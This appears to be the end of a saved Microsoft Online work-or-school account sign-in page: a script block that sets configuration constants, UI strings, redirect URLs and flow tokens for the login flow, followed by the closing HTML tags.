    Constants.FEDERATION_QUERY_PARAMETERS = '?client-request-id=faf7a6b1-5f29-4b74-9b06-5c263d331048&username=&wa=wsignin1.0&wtrealm=urn%3afederation%3aMicrosoftOnline&wctx=estsredirect%3d2%26estsrequest%3drQIIAeNisFLPKCkpKLbS188vLcnJz8_Wy09Ly0xONTYz1UvOz9XLL0rPTAGxopiBCoqEuAQ2Lvv-SzO-xHs2W4yarbGAxypGJbxG6OeXJ-pfYGTcxMTu6-QZHxzsc4Lp8mf-W0yC_kXpninhxW6pKalFiSWZ-XmPmHhDi1OL_PNyKkPys1PzJjHz5eSnZ-bFFxelxafl5JcDBYAmFiQml8SXZCZnp5bsYlZJSrIwSDMxNtM1NjYz0DUxNTfVTTIyTNa1TEsxTLFISTZMSzS-wCLwg4VxESvQ-Zynptm9yXzqu3FG_slb0QvsTrHq-2dnRZb6lUek6-eFumeaByYmpZgbFya7Gvo7-ZjklRQXB1VUeoUYa4ckpdtaWhnu4iTCwwA1'.substr(1);
    Constants.CONTEXT = 'rQIIAeNisFLPKCkpKLbS188vLcnJz8_Wy09Ly0xONTYz1UvOz9XLL0rPTAGxopiBCoqEuAQ2Lvv-SzO-xHs2W4yarbGAxypGJbxG6OeXJ-pfYGTcxMTu6-QZHxzsc4Lp8mf-W0yC_kXpninhxW6pKalFiSWZ-XmPmHhDi1OL_PNyKkPys1PzJjHz5eSnZ-bFFxelxafl5JcDBYAmFiQml8SXZCZnp5bsYlZJSrIwSDMxNtM1NjYz0DUxNTfVTTIyTNa1TEsxTLFISTZMSzS-wCLwg4VxESvQ-Zynptm9yXzqu3FG_slb0QvsTrHq-2dnRZb6lUek6-eFumeaByYmpZgbFya7Gvo7-ZjklRQXB1VUeoUYa4ckpdtaWhnu4iTCwwA1';
    Constants.BASE_URL = '/common/reprocess?';
    Constants.LATENCY_THRESHOLD = 2000;

    Constants.CDN_IMAGE_PATH = 'https://secure.aadcdn.microsoftonline-p.com/ests/2.1.4653.2/content/images/';
    Constants.PREFETCH_URL = "https://outlook.office365.com/owa/prefetch.aspx";
    Constants.IS_USE_OTHER_ACCOUNT_VISIBLE = true;
    Constants.OTHER_ACCOUNT_TEXT = "Use another account";
    Constants.MAX_USER_TILES = 5;

    Constants.PARTNER_NAME = "Sign in with your work or school account";
    Constants.DIR = 'ltr';
    Constants.METRICS_MODE = 1;  // Client metrics mode.

    if (Constants.TokenizedStringMsgs) {
        
        Constants.TokenizedStringMsgs.GENERIC_ERROR = "\u003cH1\u003eSorry, but we\u0027re having trouble signing you in\u003c/H1\u003e\u003cp\u003ePlease try again in a few minutes. If this doesn\u0027t work, you might want to contact your admin and report the following error: #~#ErrorCode#~#.\u003c/p\u003e";
        Constants.TokenizedStringMsgs.UPN_DISAMBIGUATE_MESSAGE = "It looks like {0} is used with more than one account. Which account do you want to use?";
    }

    
    Constants.FLOW_TOKEN = '';
    Constants.FLOW_TOKEN_COOKIE_NAME = 'ESTSWCTXFLOWTOKEN';
    Constants.LCID = "1033";
    Constants.MSA_ACCOUNT_IMG_ALT_TEXT = "Microsoft account symbol";
    Constants.AAD_ACCOUNT_IMG_ALT_TEXT = "Work or school account symbol";
    Constants.MSA_ACCOUNT_TILE_ALT_TEXT = "Microsoft account for {0}";
    Constants.AAD_ACCOUNT_TILE_ALT_TEXT = "Work or school account for {0}";
    Constants.REALM_RESOLVER_URL = "/common/userrealm/";
    Constants.FORCED_SIGN_IN = false;
    Constants.MSA_AUTH_URL = 'https://login.live.com/login.srf?wa=wsignin1.0&wtrealm=urn%3afederation%3aMicrosoftOnline&wctx=estsredirect%3d2%26estsrequest%3drQIIAeNisFLPKCkpKLbS188vLcnJz8_Wy09Ly0xONTYz1UvOz9XLL0rPTAGxopiBCoqEuAQ2Lvv-SzO-xHs2W4yarbGAxypGJbxG6OeXJ-pfYGTcxMTu6-QZHxzsc4Lp8mf-W0yC_kXpninhxW6pKalFiSWZ-XmPmHhDi1OL_PNyKkPys1PzJjHz5eSnZ-bFFxelxafl5JcDBYAmFiQml8SXZCZnp5bsYlZJSrIwSDMxNtM1NjYz0DUxNTfVTTIyTNa1TEsxTLFISTZMSzS-wCLwg4VxESvQ-Zynptm9yXzqu3FG_slb0QvsTrHq-2dnRZb6lUek6-eFumeaByYmpZgbFya7Gvo7-ZjklRQXB1VUeoUYa4ckpdtaWhnu4iTCwwA1&id=&cbcxt=out&uaid=faf7a6b15f294b749b065c263d331048';
    Constants.IS_CXH_REQUEST = false;
    Constants.IS_ADAL_REQUEST = false;
    Constants.IS_NAME_COEXISTENCE_ACCOUNT = false;
    Constants.ADAL_UX_OVERRIDE = false;
    Constants.CANCEL_REDIRECT_URL = 'https://outlook.office365.com/owa/?error=access_denied&error_subcode=cancel';
    Constants.IS_MSA_FED_SUPPORTED = false;
    Constants.IS_MSA_PHONE_USERNAME_SUPPORTED = false;
    Constants.IS_MSA_REDIR_SUPPORTED = false;
    Constants.MSA_DOMAIN = 'live.com';
    Constants.PROMPT = '';
    Constants.CLICKFORMORE = "Click for more actions";
    Constants.CONNECTEDTOWINDOWS = "Connected to Windows";
    Constants.SIGNEDIN = "Signed in";
    Constants.CLICKTOSIGNIN = "";
    Constants.SIGNINGOUT = "Signing out...";
    Constants.USERNAME_HINT_TEXT = 'someone@example.com ';
    Constants.IS_LOGOUT_REQUEST = false;
    Constants.SHOULD_HIDE_SIGNUP = false;
    Constants.USE_DARK_TILE_LOGO = false;
    Constants.HAS_ERROR = false;
    Constants.IS_MOBILE = false;
    Constants.SIGNOUTFORGET_URL_TEMPLATE = "/uxlogout?sessionId={0}&shouldForgetUser={1}";
    Constants.IS_HOLOGRAPHIC = false;
    Constants.Header_Text_Username = 'Sign in with your work account';
    Constants.Header_Text_Password = 'Enter your password';
    Constants.Header_Text_Privacy = 'Privacy statement';
    Constants.Use_Client_Check_Msa_Flag = true;
    Constants.DisambigHelpUrl = "https://go.microsoft.com/fwlink/p/?LinkID=733247";
    Constants.CxhFlow = "";
    Constants.EncryptOOBEPassword = true;
    Constants.Fido20_GetAssertionUserPrompt = "Use your PIN or Windows Hello to prove you own {0}";
    Constants.isChinaDC = false;
    Constants.Locale = "en-US";
    Constants.IsB2CScenario = false;

    Constants.SplitterControlData = [
    {
        "name": "Work or school account",
        "login": "Created by your IT department",
        "image": "https://secure.aadcdn.microsoftonline-p.com/ests/2.1.4653.2/content/images/work_account.png",
        "link": 'MSLogin.SplitterControl.LoginAAD',
        "authUrl": '',
        "id": 'aad_account_tile',
        "domainHint": ''
    }, {
        "name": "Personal account",
        "login": "Created by you",
        "image": "https://secure.aadcdn.microsoftonline-p.com/ests/2.1.4653.2/content/images/personal_account.png",
        "link": 'MSLogin.SplitterControl.LoginMSA',
        "authUrl": 'https://login.live.com/login.srf?wa=wsignin1.0&wtrealm=urn%3afederation%3aMicrosoftOnline&wctx=estsredirect%3d2%26estsrequest%3drQIIAeNisFLPKCkpKLbS188vLcnJz8_Wy09Ly0xONTYz1UvOz9XLL0rPTAGxopiBCoqEuAQ2Lvv-SzO-xHs2W4yarbGAxypGJbxG6OeXJ-pfYGTcxMTu6-QZHxzsc4Lp8mf-W0yC_kXpninhxW6pKalFiSWZ-XmPmHhDi1OL_PNyKkPys1PzJjHz5eSnZ-bFFxelxafl5JcDBYAmFiQml8SXZCZnp5bsYlZJSrIwSDMxNtM1NjYz0DUxNTfVTTIyTNa1TEsxTLFISTZMSzS-wCLwg4VxESvQ-Zynptm9yXzqu3FG_slb0QvsTrHq-2dnRZb6lUek6-eFumeaByYmpZgbFya7Gvo7-ZjklRQXB1VUeoUYa4ckpdtaWhnu4iTCwwA1&id=&cbcxt=out&uaid=faf7a6b15f294b749b065c263d331048',
        "id": 'mso_account_tile',
        "domainHint": 'msa'
    }];

    
    Constants.responseMode="NotSpecified";
    Constants.useFormPostResponseMode=true;
    
    
    
    Constants.appRedirectUrl="https://login.live.com/login.srf?wa=wsignin1.0\u0026amp;wtrealm=urn%3afederation%3aMicrosoftOnline\u0026amp;wctx=estsredirect%3d2%26estsrequest%3drQIIAeNisFLPKCkpKLbS188vLcnJz8_Wy09Ly0xONTYz1UvOz9XLL0rPTAGxopiBCoqEuAQ2Lvv-SzO-xHs2W4yarbGAxypGJbxG6OeXJ-pfYGTcxMTu6-QZHxzsc4Lp8mf-W0yC_kXpninhxW6pKalFiSWZ-XmPmHhDi1OL_PNyKkPys1PzJjHz5eSnZ-bFFxelxafl5JcDBYAmFiQml8SXZCZnp5bsYlZJSrIwSDMxNtM1NjYz0DUxNTfVTTIyTNa1TEsxTLFISTZMSzS-wCLwg4VxESvQ-Zynptm9yXzqu3FG_slb0QvsTrHq-2dnRZb6lUek6-eFumeaByYmpZgbFya7Gvo7-ZjklRQXB1VUeoUYa4ckpdtaWhnu4iTCwwA1\u0026amp;id=\u0026amp;cbcxt=out\u0026amp;uaid=faf7a6b15f294b749b065c263d331048";
    Constants.msaSignupUrl="https://signup.live.com/signup?id=12\u0026amp;uiflavor=web\u0026amp;lw=1\u0026amp;fl=easi2\u0026amp;wa=wsignin1.0\u0026amp;wtrealm=urn:federation:MicrosoftOnline\u0026amp;wctx=estsredirect%3d2%26estsrequest%3drQIIAeNisFLPKCkpKLbS188vLcnJz8_Wy09Ly0xONTYz1UvOz9XLL0rPTAGxopiBCoqEuAQ2Lvv-SzO-xHs2W4yarbGAxypGJbxG6OeXJ-pfYGTcxMTu6-QZHxzsc4Lp8mf-W0yC_kXpninhxW6pKalFiSWZ-XmPmHhDi1OL_PNyKkPys1PzJjHz5eSnZ-bFFxelxafl5JcDBYAmFiQml8SXZCZnp5bsYlZJSrIwSDMxNtM1NjYz0DUxNTfVTTIyTNa1TEsxTLFISTZMSzS-wCLwg4VxESvQ-Zynptm9yXzqu3FG_slb0QvsTrHq-2dnRZb6lUek6-eFumeaByYmpZgbFya7Gvo7-ZjklRQXB1VUeoUYa4ckpdtaWhnu4iTCwwA1\u0026amp;cbcxt=out\u0026amp;uaid=faf7a6b15f294b749b065c263d331048";

    Constants.isDesktopSsoEnabled = false;

    Constants.OnPremPasswordValidationConfig =
    {
        IsPollingEnabled: false,
        IsPollingRequired: false,
        PollUrl: '/common/onpremvalidation/Poll',
        MaxPolls: 20,
        PollingInterval: 500,
        Timeout: 15 * 1000,
        FlowToken: 'AQABAAEAAADRNYRQ3dhRSrm-4K-adpCJF_cuTBC9mW298MLFkjl78UeN4NcdgnFiqRsB7R5L04FUGNpIGPE8E0NFEeYocgul8-NDcb5GGysf_W--bTCpM5jsEvNAH0xHHmlzqxO_zRfsTn70CEekk5pEkE6jtTt9jSQGBQt6u6JmZu8928_Lh56Joe0qGyKfl9gZawaxC312BJiJEf9HDBORwNkEjNRCNR9WEyw-PdHVet6GhbEz5SAA'
    }

    

    if (typeof User !== "undefined") {
        // Setup cta message fields.
        User.setupCallToActionMessages();
    }

    // Other tile
    var Tiles = Tiles || {};
    Tiles.otherJSON = {
        'name': 'Use another account',
        'login': '',
        'imageAAD': 'other_glyph.png',
        'imageMSA': 'other_glyph.png',
        'isLive': false,
        'link': 'other',
        'authUrl': '',
        'sessionID': '',
        'domainHint': 'other'
    };
</script>



    


<!-- Pull suppressed as UseAgent does not indicate Win10 or mobile Win10 TH2+ -->

    

</body></html>			
																																																																																							